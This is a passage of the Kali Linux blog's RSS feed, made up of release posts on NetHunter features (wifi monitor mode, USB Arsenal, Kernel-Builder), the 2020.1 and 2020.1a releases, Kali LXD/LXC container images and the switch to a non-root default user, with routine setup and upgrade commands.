NetHunter store app under &ldquo;Expert mode&rdquo; if the store app fails to install applications. Other than that, this device is my personal favourite.</p> <p>The image is available for download on our <a href="https://www.kali.org/get-kali/#kali-mobile">Kali NetHunter download page</a>. Please note that Android 10 adds certain restrictions to the way storage access is handled. Please update the NetHunter app from the NetHunter store after flashing the image to enable the required access.</p> <h2 id="monitor-mode-for-internal-qcacld-wlan0-chips">Monitor mode for internal QCACLD wlan0 chips</h2> <p>Over the past few months, various researchers and developers have independently discovered a little gem amongst all the commits to the Qualcomm qcacld-3.0 wifi driver in the Code Aurora Forum: <a href="https://gitlab.com/Codeaurora/platform_vendor_qcom-opensource_wlan_qcacld-3.0/-/commit/a307f63059c7fb5e89c12e057d80fe0948c11e3b">A patch to enable monitor mode</a></p> <p>One of those researchers was our very own <a href="https://twitter.com/kimocoder">@Kimocoder</a> who immediately mobilised <a href="https://twitter.com/simonpunk1">@simonpunk</a> &amp; <a href="https://github.com/johanlike">#DJY</a> to develop kernel patches and NetHunter extensions to bring us that amazing feature within days of discovery. Outstanding work and we are incredibly proud of their achievement.</p> <p>Both the OnePlus 7 and Xiaomi Mi 9T images fully support this feature. We also added custom commands to start / stop the monitor mode for wlan0:</p> <p><p> <a href='https://www.kali.org/blog/kali-nethunter-updates/images/NH-Release-2020.2-pre-08-WLAN0-NetHunter.png'> <img src="https://www.kali.org/blog/kali-nethunter-updates/images/NH-Release-2020.2-pre-08-WLAN0-NetHunter.png" alt="" /> </a> </p> </p> <p>We are working tirelessly to roll out this kernel patch to other devices and we welcome everybody&rsquo;s input. If you would like to develop a custom kernel for NetHunter, please keep reading about our new kernel-builder and join us in our <a href="https://forums.kali.org/forumdisplay.php?35-App-Store">forums</a>. The more devices we can support the better and the more people involved the more fun we are all going to have.</p> <h2 id="usb-arsenal-for-hid-attacks-and-more">USB Arsenal for HID attacks and more</h2> <p>Newer Android kernels (4.x) no longer require patches to add Human Interface Device (HID) gadget mode to our devices, which is required for rubber ducky style USB attacks.</p> <p>HID gadget mode is now fully supported by default but has to be enabled and configured via userspace controls. We have implemented a two tier USB gadget mode control centre:</p> <ol> <li> <p>NetHunter kernel packages can install custom init.rc files with device specific USB gadget mode controls</p> </li> <li> <p>NetHunter app developer extraordinaire <a href="https://twitter.com/simonpunk1">@simonpunk</a> has developed a menu for the NetHunter app called &ldquo;USB Arsenal&rdquo;, which can either trigger the functions defined in the init.rc, or - if no device specific init.rc exists - allows you to configure your own gadget mode.</p> </li> </ol> <p><p> <a href='https://www.kali.org/blog/kali-nethunter-updates/images/NH-Release-2020.2-pre-04a-USB-Arsenal1.png'> <img src="https://www.kali.org/blog/kali-nethunter-updates/images/NH-Release-2020.2-pre-04a-USB-Arsenal1.png" alt="" /> </a> </p> </p> <p>But he didn&rsquo;t stop there. The USB Arsenal also allows you to mount images (img and iso) and to provide them as a mass storage device to target machines as if it were a USB stick.</p> <p><p> <a href='https://www.kali.org/blog/kali-nethunter-updates/images/NH-Release-2020.2-pre-04b-USB-Arsenal2.png'> <img src="https://www.kali.org/blog/kali-nethunter-updates/images/NH-Release-2020.2-pre-04b-USB-Arsenal2.png" alt="" /> </a> </p> </p> <p>On top of that, the USB Arsenal provides a menu to set up USB network tethering.</p> <p><p> <a href='https://www.kali.org/blog/kali-nethunter-updates/images/NH-Release-2020.2-pre-04c-USB-Arsenal3.png'> <img src="https://www.kali.org/blog/kali-nethunter-updates/images/NH-Release-2020.2-pre-04c-USB-Arsenal3.png" alt="" /> </a> </p> </p> <p>We are incredibly excited about the US Arsenal and will dedicate an entire article about this useful application in the near future.</p> <h2 id="nethunter-kernel-builder">NetHunter Kernel Builder</h2> <p>We are providing three different editions of Kali NetHunter:</p> <ul> <li>Kali NetHunter rootless, which delivers over 85% of Kali NetHunter functionality to Android devices without the need to root the device or install a custom recovery</li> <li>Kali NetHunter light, which delivers over 95% of Kali NetHunter functionality to devices that are rooted and have a custom recovery but for which no NetHunter kernel exists (yet)</li> <li>Kali NetHunter, which delivers 100% but requires a rooted device with a custom recovery and a kernel that has been custom built for NetHunter</li> </ul> <p>Building a custom kernel for NetHunter is not black magic but is does require experimentation, patience, resilience and a lot of time&hellip;</p> <p>&hellip;or it used to.</p> <p>We have created the NetHunter Kernel-Builder. A one stop shop to:</p> <ul> <li>Download and setup the toolchains required by your particular kernel</li> <li>Provide over <a href="https://images.kali.org/nethunter/toolchains/">ten different pre-built toolchains</a> to cater for everybody&rsquo;s needs</li> <li>Create a NetHunter kernel config</li> <li>Patch the kernel with standard and device specific patches from a central repository</li> <li>Build the kernel</li> <li>Create anykernel zip to test the kernel (full functionality requires a NetHunter image or kernel package)</li> <li>Create a zip file to extract in the nethunter-installer folder to build nethunter images</li> </ul> <p>We have been using the Kernel-Builder to build the kernels for all devices on this page and it saved us over 75% of the time it would have taken us in the past. We have added example config files that allows you to compile the kernels for the devices on this page and you can use them as a guide to build a kernel for your own device.</p> <p>The Kernel-Builder is a great tool to simplify and automate and whilst it is also ideal to learn about Android kernel building, it requires skills to build kernels and it takes time to master those skills. The Kernel-Builder will help freeing that time by eliminating repetitive and redundant tasks and documentations.</p> <p>On the topic of documentation; the documentation for the kernel builder is yet to be completed but we plan to finish that within 7 days of this blog post going up.</p> <p>Please check out the kernel-builder repo and join us in our <a href="https://forums.kali.org/forumdisplay.php?35-App-Store">forums</a> if you are interested in building NetHunter kernels. We&rsquo;d love to have you on board.</p> <p><p> <a href='https://www.kali.org/blog/kali-nethunter-updates/images/NH-Release-2020.2-pre-09-Kernel-Builder.png'> <img src="https://www.kali.org/blog/kali-nethunter-updates/images/NH-Release-2020.2-pre-09-Kernel-Builder.png" alt="" /> </a> </p> </p> <p>Please join us in the <a href="https://forums.kali.org/forumdisplay.php?35-App-Store">forums</a> or on <a href="https://www.kali.org/docs/community/kali-linux-irc-channel/">IRC</a> OFTC, #NetHunter](<a href="https://webchat.oftc.net/?randomnick=1&amp;channels=nethunter)">https://webchat.oftc.net/?randomnick=1&amp;channels=nethunter)</a>.</p> <p>Download the brand new, mid-term release images for the <a href="https://www.kali.org/get-kali/#kali-mobile">Nexus 6P, Oneplus 7 series, and Xiaomi 9T here</a>.</p></description>
</item>
<item>
<title>Kali Linux 2020.1a Release</title>
<link>https://www.kali.org/blog/kali-linux-2020-1a-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2020-1a-release/</guid>
<pubDate>Tue, 03 Mar 2020 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-2020-1a-release/images/kali-20201apng.jpg" type="image/jpg"/>
<description><p>Just a quick update to the <a href="https://www.kali.org/blog/kali-linux-2020-1-release/">2020.1 release</a> we put out last month. We made some major changes to the installers, and some people had a few issues with some of the images we released. So, we made some slight alternations to smooth things out and make the install process easier for everyone.</p> <hr> <h2 id="base-image">Base Image</h2> <p>Before, we used to release multiple separate installers for different Desktop Environments (DE). With 2020.1 we changed how we distributed our base images, without having multiple different ISOs for each DE, by introducing a &ldquo;installer&rdquo; image as well as a &ldquo;live&rdquo; image.</p> <p>Both accomplish the same thing, but how they do it is different. The &ldquo;installer&rdquo; image is the new one, as this uses &ldquo;debian-cd&rdquo; on the back-end. We noticed <a href="https://bugs.kali.org/view.php?id=6053">a bug</a> in a dependency chain, which caused an issue with x11. As a result, you may not have got a graphical interface after installing Kali. As a result, <a href="https://www.kali.org/get-kali/">we pushed out a fix (2020.1a)</a> to address this.</p> <p><strong>Note: If you are already running 2020.1, you do not need to reinstall. The 2020.1a release is only for those who weren&rsquo;t able to successfully install 2020.1</strong></p> <hr> <h2 id="raspberry-pi">Raspberry Pi</h2> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-1a-release/images/raspberry-pi.png'> <img src="https://www.kali.org/blog/kali-linux-2020-1a-release/images/raspberry-pi.png" alt="" /> </a> </p> </p> <p>We have also pushed out an updated image, both 32-bit and 64-bit for <a href="https://www.kali.org/get-kali/#kali-arm">Raspberry Pi</a>, due to some files being corrupt in the initial image.</p> <hr> <h2 id="vagrant">Vagrant</h2> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-1a-release/images/VAGRANT_CLOUD.png'> <img src="https://www.kali.org/blog/kali-linux-2020-1a-release/images/VAGRANT_CLOUD.png" alt="" /> </a> </p> </p> <p>Since the introduction of a <a href="https://www.kali.org/blog/kali-default-non-root-user/">non-root user</a>, we have switched the <a href="https://www.kali.org/docs/introduction/default-credentials/">default user</a> to be <code>kali</code>. We also moved the <a href="https://app.vagrantup.com/kalilinux/boxes/rolling">vagrant image</a> to this user as well. However, we <a href="https://gitlab.com/kalilinux/build-scripts/kali-vagrant/-/issues/1/">reverted it back</a> to <code>vagrant</code> to be more in line with their best practices.</p> <p>Not long after this fix, we have received <a href="https://gitlab.com/kalilinux/build-scripts/kali-vagrant/-/merge_requests/1">a contribution</a> to fix a bug that would occur if you defined an additional network inteface in the Vagrantfile.</p> <p>You can find both of those fixes in the latest version of the Vagrant box (2020.1.2).</p> <hr> <h2 id="pinebook-pro">PineBook Pro</h2> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-1a-release/images/kali-pinebook-pro.png'> <img src="https://www.kali.org/blog/kali-linux-2020-1a-release/images/kali-pinebook-pro.png" alt="" /> </a> </p> </p> <p>We have got Kali Linux running on a PineBook Pro! Please <a href="https://www.kali.org/get-kali/#kali-arm">download a copy</a> and try it out if you have a PineBook! If you don&rsquo;t know what the PineBook is, <a href="https://www.pine64.org/pinebook-pro/">check it out!</a></p> <hr> <h2 id="20202">2020.2</h2> <p>Thanks to everyone who reported an issue on the bug tracker (Sorry, twitter doesn&rsquo;t count). Keep them coming so we can make 2020.2 even stronger!</p> <p><em>If you have read this far, we are aiming for a Tuesday in May for its release.</em></p></description>
</item>
<item>
<title>Kali Everywhere!</title>
<link>https://www.kali.org/blog/kali-everywhere/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-everywhere/</guid>
<pubDate>Wed, 19 Feb 2020 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-everywhere/images/kali-everywhere-v2.jpg" type="image/jpg"/>
<description><p>There was some recent noise around <a href="https://www.zdnet.com/article/uk-police-distance-themselves-from-poster-warning-parents-to-report-kids-for-using-kali-linux/">children and their use of Kali</a>, so @Re4son stepped up with a new way to run Kali in locations where it may have been hard to in the past. This allows you to run Kali instances inside other Unix systems, making Kali even more accessible to kids than before. Welcome <a href="https://www.kali.org/docs/containers/kalilinux-lxc-images/">LXD</a>.</p> <p><p> <a href='https://www.kali.org/blog/kali-everywhere/images/release-2020.1-poster.png'> <img src="https://www.kali.org/blog/kali-everywhere/images/release-2020.1-poster.png" alt="" /> </a> </p> </p> <p>This is added to our other alternative versions of Kali such as <a href="https://www.kali.org/docs/containers/official-kalilinux-docker-images/">Docker instances</a>, <a href="https://www.kali.org/docs/cloud/digitalocean/">cloud images</a>, <a href="https://www.kali.org/blog/wsl2-and-kali/">WSL</a>, <a href="https://www.kali.org/blog/announcing-kali-for-vagrant/">Vagrant</a>, <a href="https://www.kali.org/docs/nethunter/">NetHunter</a>, <a href="https://www.kali.org/blog/azure-marketplace-weekly-iso-builds/">Azure</a>, and so on. We have the goal to make Kali as easily available to you as possible, so you always have access to it whenever you may need it.</p> <p>After all, <a href="https://twitter.com/kalilinux/status/1229906554079645696">Kali is for the children</a>. ??</p> <h2 id="kali-linux-lxc--lxd-images-released">Kali Linux LXC / LXD Images Released</h2> <p>Thanks to the awesome people maintaining the <a href="https://images.linuxcontainers.org/">Linux Image Server for LXC and LXD</a>, our Kali Linux container images are now available for easy installation using LXD or LXC. If you are already running Kali Linux but need to protect your machine from yourself whilst reversing that funky malware you just discovered, or you got issued a work laptop running Ubuntu but you really crave a bit of Kali power then Linux Containers are the perfect solution for you.</p> <h2 id="linux-containers-are-amazing">Linux Containers are Amazing</h2> <p>Figuring out how to use LXD was as simple as <a href="https://linuxcontainers.org/lxd/try-it/">trying it out online</a>.</p> <p>We quickly adopted Linux Containers as our go-to solution for reversing, developing, packaging, testing&hellip; well pretty much for all the tasks that requires us to protect our production equipment from ourselves. Linux Containers are a great alternative to Virtual Machines, without the overhead. They are as awesome as docker containers but for entire systems, not just for single applications.</p> <p>We personally recommend using LXD on Ubuntu and LXC on other Linux distributions but that is purely personal preference as that is what is natively supported by those systems.</p> <p>We have published a dedicated page in our <a href="https://www.kali.org/docs/containers/kalilinux-lxc-images/">Kali Linux Documentation site</a> with step-by-step guides on how to install containers in the following scenarios:</p> <ul> <li>Kali Linux LXD container on Ubuntu host for running command line applications</li> <li>Kali Linux LXD container on Ubuntu host for running GUI applications</li> <li>Kali Linux LXC privileged container on Kali host</li> <li>Kali Linux LXC unprivileged container on Kali host</li> </ul> <p>Let&rsquo;s see how easy it is to launch a Kali LXD container image in Ubuntu:</p> <h2 id="setting-up-a-kali-linux-lxd-image-in-ubuntu">Setting up a Kali Linux LXD Image in Ubuntu</h2> <p>Obviously, to get this running, you need LXD installed. In Ubuntu we can install LXD as a snap package. Once installed we launch a Kali Linux container image, install some additional packages and create a non-root user. The whole procedure should only take a few minutes before we can log in:</p> <pre><code class="language-sh">## Install LXD sudo snap install lxd lxd init ## Launch the container lxc launch images:kali/current/amd64 my-kali ## Install some additional applications, use either light or default lxc exec my-kali -- passwd ## First things first lxc exec my-kali -- apt install kali-linux-light ## Bare minimum lxc exec my-kali -- apt install kali-linux-default ## Default set of packages ## Setup non-root user lxc exec my-kali -- adduser kali lxc exec my-kali -- usermod -aG sudo kali lxc exec my-kali -- sed -i '1 i\TERM=xterm-256color' /home/kali/.bashrc lxc exec my-kali -- sh -c &quot;echo 'Set disable_coredump false' &gt; /etc/sudo.conf&quot; ## Login lxc console my-kali </code></pre> <p><p> <a href='https://www.kali.org/blog/kali-everywhere/images/LXD-055_Ubuntu_KaliCliSession_DE.png'> <img src="https://www.kali.org/blog/kali-everywhere/images/LXD-055_Ubuntu_KaliCliSession_DE.png" alt="" /> </a> </p> </p> <p>Voila! That&rsquo;s all there is to it.</p> <p>You can even run GUI applications from the LXD container but that requires a few more steps to set up, as detailed in our <a href="https://www.kali.org/docs/containers/kalilinux-lxc-images/">Documentation</a>.</p> <p><p> <a href='https://www.kali.org/blog/kali-everywhere/images/LXD-090_Ubuntu_KaliGuiSession.png'> <img src="https://www.kali.org/blog/kali-everywhere/images/LXD-090_Ubuntu_KaliGuiSession.png" alt="" /> </a> </p> </p> <p>Running an unprivileged Kali Linux container on a Kali host using LXC might not look as dramatic but is just as useful:</p> <p><p> <a href='https://www.kali.org/blog/kali-everywhere/images/LXD-100_Kali_UnPrivSession.png'> <img src="https://www.kali.org/blog/kali-everywhere/images/LXD-100_Kali_UnPrivSession.png" alt="" /> </a> </p> </p> <p>Have fun with your Kali LXC / LXD images!</p></description>
</item>
<item>
<title>Kali Linux 2020.1 Release (Non-Root, Single Installer & NetHunter Rootless)</title>
<link>https://www.kali.org/blog/kali-linux-2020-1-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2020-1-release/</guid>
<pubDate>Tue, 28 Jan 2020 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-2020-1-release/images/kali-2020.1.jpg" type="image/jpg"/>
<description><p>We are here to kick off our first release of the decade, with Kali Linux 2020.1! Available for immediate <a href="https://www.kali.org/get-kali/">download</a>.</p> <p>The following is a brief feature summary for this release:</p> <ul> <li><a href="https://www.kali.org/blog/kali-default-non-root-user/">Non-Root by default</a></li> <li>Kali single installer image</li> <li><a href="https://www.kali.org/docs/nethunter/nethunter-rootless/">Kali NetHunter Rootless</a></li> <li>Improvements to theme &amp; kali-undercover</li> <li>New tools</li> </ul> <h2 id="non-root">Non-Root</h2> <p>Throughout the history of Kali (and its <a href="https://www.kali.org/docs/introduction/kali-linux-history/">predecessors</a> <a href="https://www.backtrack-linux.org/">BackTrack</a>, WHAX, and Whoppix), the default credentials have been <code>root/toor</code>. This is no more. We are no longer using the superuser account, root, as default in Kali 2020.1. The default user account is now a <a href="https://www.kali.org/docs/policy/kali-linux-user-policy/">standard, unprivileged, user</a>.</p> <p>For more of the reasons behind this switch, please see our <a href="https://www.kali.org/blog/kali-default-non-root-user/">previous blog post</a>. As you can imagine, this is a very large change, with years of history behind it. As a result, if you notice any issues with this, please do let us know on the <a href="https://bugs.kali.org/">bug tracker</a>.</p> <p><code>root/toor</code> is dead. Long live <code>kali/kali</code>.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-1-release/images/kali-kali-login.png'> <img src="https://www.kali.org/blog/kali-linux-2020-1-release/images/kali-kali-login.png" alt="" /> </a> </p> </p> <h4 id="kali-as-your-main-os">Kali as your Main OS</h4> <p>So with this, should you use Kali as your daily driver, as the primary OS? It&rsquo;s up to you. There wasn&rsquo;t anything really stopping you before, we just don&rsquo;t encourage it. We still don&rsquo;t. But its a helping hand for the people who are familiar with Kali enough.</p> <p>Why do we not recommend it? Because we are unable to test for that usage pattern and we don&rsquo;t want the influx of bug reports that would come with it. If you are brave enough to try it, you may wish to switch the <a href="https://www.kali.org/docs/general-use/kali-branches/">branch from &ldquo;rolling&rdquo; to &ldquo;kali-last-snapshot&rdquo;</a> to try and be more stable.</p> <h2 id="kali-single-installer-image">Kali Single Installer Image</h2> <p>We took a good hard look at the usage of Kali, what images are actually downloaded, how they are put to use, and so on. With this information in hand, we decided to completely restructure and simplify the images we release. Going forward, we will have an installer image, a live image, and a network installer image.</p> <p>These changes should allow for easier selection of the right image for you to download, while increasing flexibility on installation and further reducing download sizes.</p> <p><strong>Our Installer Image</strong></p> <ul> <li>This is what we recommend for most users that want to install Kali on their system</li> <li>Doesn&rsquo;t require a network connection (aka offline install) for the default package selection</li> <li>Able to select desktop environment to install (Previously there was a separate image for each DE: XFCE, GNOME, KDE, etc.)</li> <li>Able to select tools to install at install time</li> <li>Can&rsquo;t be used to boot a live system. This is just an installer image.</li> <li>Filename: <ul> <li><code>kali-linux-2020.1-installer-&lt;amd64|i386&gt;.iso</code></li> </ul> </li> </ul> <p>We are no longer offering separate images for every desktop environment (DE). Instead, we now have a single image with the option to pick your DE during installation. This means there isn&rsquo;t a download link for Xfce (which is our default option since <a href="https://www.kali.org/blog/kali-linux-2019-4-release/">2019.4</a>), GNOME, KDE, MATE or LXDE DEs. Just one image to rule them all.</p> <p>At install time, you may <a href="https://www.kali.org/docs/general-use/metapackages/">select the tools included</a> with Kali (or <strong>none at all</strong>)! This gives you more control over what <strong>you</strong> want. We understand that Kali comes with more tools than some people use, or they have their own select tools they use. Now they can install Kali without any metapackages, giving them a bare Kali installation, so they can <strong>individually select what tools they want</strong> (rather than groups/).</p> <p>The default image contains the <code>kali-desktop-xfce</code> and <code>kali-tools-default</code> packages, allowing for an offline installation of Kali (as it always has been). Selecting any non-default tools will require a network connection.</p> <p>Note: &ldquo;Kali Live&rdquo; is not included in this image. If you wish to use live mode, you&rsquo;ll need the live image.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-1-release/images/tasksel_first_0.png'> <img src="https://www.kali.org/blog/kali-linux-2020-1-release/images/tasksel_first_0.png" alt="" /> </a> </p> </p> <p><strong>Network Install Image</strong></p> <ul> <li>Smallest image to download</li> <li>This requires a network connection to install</li> <li>During setup, it will download the latest packages every time it&rsquo;s used</li> <li>Able to select desktop environment to install</li> <li>Able to select tools to install</li> <li>Can&rsquo;t be used to boot a live system. This is just an installer image.</li> <li>Filename: <ul> <li><code>kali-linux-2020.1-installer-netinst-&lt;amd64|i386&gt;.iso</code></li> </ul> </li> </ul> <p>It&rsquo;s a very small image, containing only enough to install the base system, but behaving exactly like the full installer image, allowing you to install everything that Kali offers, provided that you have enabled network connectivity.</p> <p><strong>Live Image</strong></p> <ul> <li>Its primary use is to be able to run Kali, without installing it</li> <li>But it also contains an installer, behaving like the &ldquo;Network Install Image&rdquo; described above</li> <li>Filename: <ul> <li><code>kali-linux-2020.1-live-&lt;amd64|i386&gt;.iso</code></li> </ul> </li> </ul> <p>&ldquo;Kali Live&rdquo; hasn&rsquo;t been forgotten about - it&rsquo;s just moved to its own image. This allows you to try Kali without installing it and is perfect for running off a USB stick. You can install from this image, however, it will require a network connection (this is why we suggest the stand-alone install image for most users).</p> <p>Alternatively, you can <a href="https://www.kali.org/docs/development/dojo-mastering-live-build/">generate your own image</a>, in particular if you want to use another desktop environment instead of our default Xfce. It&rsquo;s not as hard as it sounds!.</p> <h2 id="arm-images">ARM Images</h2> <p>You will probably notice a bit of a change in the ARM images starting with our 2020.1 release. There are fewer images available for download, due to both manpower and hardware constraints, some images won&rsquo;t be posted without community assistance. The scripts are still updated, so if an image doesn&rsquo;t exist for a machine you use, you will have to create it by running the <a href="https://gitlab.com/kalilinux/build-scripts/kali-arm">build script</a> on a Kali machine.</p> <p>ARM images for 2020.1 will still run as root by default.</p> <p>The sad news that a lot of people didn&rsquo;t want to hear&hellip; an image for the Pinebook Pro isn&rsquo;t included in the 2020.1 release. We are still working on getting it added, and as soon as it is ready we will post it.</p> <h2 id="nethunter-images">NetHunter Images</h2> <p>Our mobile pen-testing platform, Kali NetHunter, has also had some new improvements. You are now no longer required to root your phone in order to run Kali NetHunter, but that does come with some limitations.</p> <p>To suit everybody&rsquo;s needs, Kali NetHunter now comes in the following three editions:</p> <ul> <li><strong>NetHunter</strong> - Needs rooted devices with custom recovery and patched kernel. Has no restrictions. Device specific images are available <a href="https://www.kali.org/get-kali/#kali-mobile">here</a>.</li> <li><strong>NetHunter Light</strong> - Needs rooted devices with custom recovery but no custom kernel. Has minor restrictions, i.e. no WiFi injection or HID support. Architecture specific images are available <a href="https://www.kali.org/get-kali/#kali-mobile">here</a>.</li> <li><strong>NetHunter Rootless</strong> - Installable on all stock standard, unmodified devices using Termux. Some limitations, like lack of db support in Metasploit and no root permissions. Installation instruction is available <a href="https://www.kali.org/docs/nethunter/nethunter-rootless/">here</a>.</li> </ul> <p>The <a href="https://www.kali.org/docs/nethunter/#1-0-nethunter-editions/">NetHunter documentation page</a> includes a more detailed comparison. Each NetHunter edition comes with both the new &ldquo;kali&rdquo; user as well as root. KeX now supports multiple sessions so you can opt to run your pentest in one whilst writing a report in another.</p> <p>Please note that due to how Samsung Galaxy devices function, the non-root user might not be able to run <code>sudo</code> but has to use <code>su -c</code> instead.</p> <p>One of the peculiarities of the new &ldquo;NetHunter Rootless&rdquo; edition is that the default non-root user has almost full privileges in the chroot due to how proot containers work.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-1-release/images/release-2020.1-nethunter1-scaled.png'> <img src="https://www.kali.org/blog/kali-linux-2020-1-release/images/release-2020.1-nethunter1-scaled.png" alt="" /> </a> </p> </p> <h2 id="theming">Theming</h2> <p>With our last release, we made a major change switching from GNOME to Xfce. That wasn&rsquo;t the end for us; we have kept on going with the design work, and have more updates:</p> <p><strong>GNOME</strong> There is now a new theme for GNOME users and as an additional bonus, there is a light and dark theme!</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-1-release/images/release-2020.1-gnome-shell-overview.png'> <img src="https://www.kali.org/blog/kali-linux-2020-1-release/images/release-2020.1-gnome-shell-overview.png" alt="" /> </a> </p> </p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-1-release/images/release-2020.1-gnome-shell-light.png'> <img src="https://www.kali.org/blog/kali-linux-2020-1-release/images/release-2020.1-gnome-shell-light.png" alt="" /> </a> </p> </p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-1-release/images/release-2020.1-gnome-shell-dark.png'> <img src="https://www.kali.org/blog/kali-linux-2020-1-release/images/release-2020.1-gnome-shell-dark.png" alt="" /> </a> </p> </p> <p><strong>Tools</strong> We are giving the tools that you are very fond of a makeover too! We are slowly working through our collection, refreshing them and adding in new icons.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-1-release/images/release-2020.1-icons.png'> <img src="https://www.kali.org/blog/kali-linux-2020-1-release/images/release-2020.1-icons.png" alt="" /> </a> </p> </p> <p><strong>Menu</strong> Eagle-eyed users may also notice the icons used in the menu have also been replaced.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-1-release/images/release-2020.1-menu.png'> <img src="https://www.kali.org/blog/kali-linux-2020-1-release/images/release-2020.1-menu.png" alt="" /> </a> </p> </p> <p><strong>Setup</strong> And if you opt to use the graphical installer of Kali, it&rsquo;s also been updated <em>(Before and after shots)</em></p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-1-release/images/release-2020.1-setup.png'> <img src="https://www.kali.org/blog/kali-linux-2020-1-release/images/release-2020.1-setup.png" alt="" /> </a> </p> </p> <h2 id="kali-undercover">Kali-Undercover</h2> <p>We were not expecting the community&rsquo;s overwhelming response to kali-undercover. So carrying on from <a href="https://www.kali.org/blog/kali-linux-2019-4-release/">Kali 2019.4 release</a>, Kali-undercover now starts to feel even more like Windows to help blend in.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-1-release/images/release-2020.1-undercover.png'> <img src="https://www.kali.org/blog/kali-linux-2020-1-release/images/release-2020.1-undercover.png" alt="" /> </a> </p> </p> <h2 id="new-packages">New Packages</h2> <p>Kali Linux is a rolling distribution, so it gets updates as soon as they are available, rather than waiting for &ldquo;the next release&rdquo;. So since the last release, we have the normal tool upgrades as well as a few new tools added, such as: <code>cloud-enum</code>, <code>emailharvester</code>, <code>phpggc</code>, <code>sherlock</code>, <code>splinter</code>.</p> <p>We have a few new (<code>kali-community-wallpapers</code>) and old (<code>kali-legacy-wallpapers</code>) wallpapers to offer up if you want to customize or are feeling a little a little nostalgic.</p> <h2 id="python-2-end-of-life">Python 2 End Of Life</h2> <p>As a reminder, <a href="https://www.kali.org/blog/python-2-end-of-life/">Python 2 has reached &ldquo;end of life&rdquo;</a> on the 1st of January 2020. What this means is, we are removing tools that depend on Python 2. Why? Because they are no longer being maintained, they are not receiving updates, and they need replacing. The pentesting landscape is a dynamic field that is forever changing. It&rsquo;s time to keep up. We will be doing our best to find alternatives that are actively worked upon.</p> <h2 id="giving-a-helping-hand">Giving A Helping Hand</h2> <p>If you want to <a href="https://www.kali.org/docs/community/contribute/">contribute to Kali</a> please do! If you have an area, idea of something YOU would like to work on, please dig in. If you want to help, but don&rsquo;t know where to start, please see <a href="https://www.kali.org/docs/community/contribute/">our docs page</a>. If you have a suggestion for a feature, please record it on the <a href="https://bugs.kali.org/">bug tracker</a>.</p> <p>Note: the bug tracker is for <a href="https://www.kali.org/docs/community/submitting-issues-kali-bug-tracker/">bugs &amp; suggestions</a>. Its not a place to get help or support - that&rsquo;s for the <a href="https://forums.kali.org/">forums</a>.</p> <h2 id="download-kali-linux-20201">Download Kali Linux 2020.1</h2> <p><strong>Fresh images</strong> Why are you waiting? Start <a href="https://www.kali.org/get-kali/">downloading</a> now!</p> <p><strong>Existing Upgrades</strong> If you already have an existing Kali installation, remember you can always do a quick update:</p> <pre><code class="language-console">kali@kali:~$ echo &quot;deb http://http.kali.org/kali kali-rolling main contrib non-free&quot; | sudo tee /etc/apt/sources.list kali@kali:~$ kali@kali:~$ sudo apt update &amp;&amp; sudo apt -y full-upgrade kali@kali:~$ kali@kali:~$ [ -f /var/run/reboot-required ] &amp;&amp; sudo reboot -f kali@kali:~$ </code></pre> <p>You should now be on Kali Linux 2020.1. We can do a quick check by doing:</p> <pre><code class="language-console">kali@kali:~$ grep VERSION /etc/os-release VERSION=&quot;2020.1&quot; VERSION_ID=&quot;2020.1&quot; VERSION_CODENAME=&quot;kali-rolling&quot; kali@kali:~$ kali@kali:~$ uname -v #1 SMP Debian 5.4.13-1kali1 (2020-01-20) kali@kali:~$ kali@kali:~$ uname -r 5.4.0-kali3-amd64 kali@kali:~$ </code></pre> <p>NOTE: The output of <code>uname -r</code> may be different depending on <a href="https://pkg.kali.org/pkg/linux-latest">architecture</a>.</p> <p>As always, should you come across any bugs in Kali, please submit a report on our <a href="https://bugs.kali.org/main_page.php">bug tracker</a>. We&rsquo;ll never be able to fix what we don&rsquo;t know is broken.</p></description>
</item>
<item>
<title>Kali Default Non-Root User</title>
<link>https://www.kali.org/blog/kali-default-non-root-user/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-default-non-root-user/</guid>
<pubDate>Tue, 31 Dec 2019 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-default-non-root-user/images/non-root-default-kali-user.jpg" type="image/jpg"/>
<description><p>For years now, Kali has inherited the default root user policy from BackTrack. As part of our evaluation of <a href="https://www.kali.org/tools/">Kali tools</a> and <a href="https://www.kali.org/docs/policy/">policies</a> we have decided to change this and move Kali to a &ldquo;traditional default non-root user&rdquo; model. This change will be part of the 2020.1 release, currently scheduled for late January. However, you will notice this change in the <a href="https://cdimage.kali.org/kali-weekly/">weekly images</a> starting now.</p> <h2 id="the-history-of-default-root-user">The History of Default Root User</h2> <p>In the beginning, there was <a href="https://www.backtrack-linux.org/">BackTrack</a>. In its original form, BackTrack (v1-4) was a Slackware live based distro intended to be ran from a CDROM. Yes, we do go back a ways <em>(2006!)</em>.</p> <p>In this model, there was no real update mechanism, just a bunch of pentesting tools living in the <code>/pentest/</code> directory, that you could use as part of assessments. It was the early days, so things were not very sophisticated, we were just all happy things worked. A lot of those tools back then either required root access to run or ran better when ran as root. With this operating system that would be ran from a CD, never be updated, and had a lot of tools that needed root access to run it was a simple decision to have a &ldquo;everything as root&rdquo; security model. It made complete sense for the time.</p> <p>As time went by however, there were a number of changes. All of us that were around back then sort of remember things a little differently but 